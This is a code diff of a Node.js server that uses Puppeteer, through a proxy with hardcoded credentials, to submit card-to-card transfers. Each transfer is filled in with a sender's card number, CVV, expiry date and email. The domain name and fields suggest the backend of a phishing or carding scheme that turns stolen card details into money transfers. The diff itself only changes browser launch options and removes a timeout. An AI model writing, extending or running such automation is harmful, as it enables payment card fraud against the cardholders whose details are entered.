@@ -6,7 +6,6 @@ const bodyParser = require('body-parser')
 const https = require("https"),
   fs = require("fs");
 
-  const obj = {};
 
 const options = {
   key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
@@ -21,7 +20,7 @@ app.use(bodyParser.json())
 app.use(cors())
 
 const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
-    const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
+    const browser = await puppeteer.launch({headless: false, slowMo: 40, args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
     await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
     await page.setViewport({ width: 1920, height: 984 })
@@ -52,8 +51,6 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     await page.click('.submit-button-298')
 
     await page.waitForNavigation({waitUntil: 'networkidle2'});
-
-    await page.waitForTimeout(5000);
 
     return page.url()
 }
